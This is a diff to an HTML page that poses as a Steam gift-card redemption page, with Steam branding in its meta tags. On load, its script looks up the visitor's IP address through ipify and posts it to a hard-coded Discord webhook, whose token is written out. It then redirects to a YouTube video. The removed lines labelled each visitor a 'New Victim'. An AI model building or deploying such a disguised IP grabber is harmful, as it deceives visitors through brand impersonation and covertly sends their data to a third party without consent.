@@ -8,46 +8,35 @@
     <meta property="og:title" content="Steam Gift Activation" />
     <meta property="og:description" content="Redeem a Steam Gift Card or Wallet Code" />
     <meta property="og:url" content="https://www.youtube.com/watch?v=dQw4w9WgXcQ" />
-    <meta property="og:image" content="https://cdn.fastly.steamstatic.com/store/about/social-og.jpg" />
+    <meta property="og:image" content="https://cdn.akamai.steamstatic.com/store/about/social-og.jpg" />
+    <meta property="og:type" content="website" />
     <meta name="twitter:card" content="summary_large_image" />
     <meta name="theme-color" content="#171a21" />
 
     <script type="text/javascript">
-        // Your Discord Webhook URL
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1477709893875269763/hlcZYdFcsZCA4t0JKeO8Hr0IBum2-KgPZMMsx426yUp4VeOEoTgfGSz8g7mOtvND6pT';
 
         async function logAndRedirect() {
             try {
-                // 1. Get the IP
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
-                const clientIp = ipData.ip;
-
-                // 2. Send to Discord
-                // We 'await' this so the browser doesn't redirect until the message is sent
+                
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: `**New Victim Logged**\n**IP:** \`${clientIp}\` \n**Platform:** Steam Gift Page\nhttps://tse1.mm.bing.net/th/id/OIP.mu-ECsXxHgl049if-NFUogHaDt?rs=1&pid=ImgDetMain&o=7&rm=3`
+                        content: `📢 **New Visitor Logged**\n**IP:** \`${ipData.ip}\``
                     })
                 });
-            } catch (error) {
-                console.error('Error:', error);
-            } finally {
-                // 3. Redirect to YouTube
+            } catch (e) { console.error(e); }
+            finally {
                 window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
             }
         }
-
-        // Execute when the page is ready
         window.onload = logAndRedirect;
     </script>
 </head>
 <body style="background-color: #171a21; color: white; font-family: sans-serif; text-align: center; padding-top: 50px;">
-    <div>
-        <p>Redirecting to Steam Gift Activation...</p>
-        <p>If the page does not load, <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ" style="color: #66c0f4;">click here</a>.</p>
-    </div>
+    <p>Redirecting to Steam...</p>
 </body>
 </html>
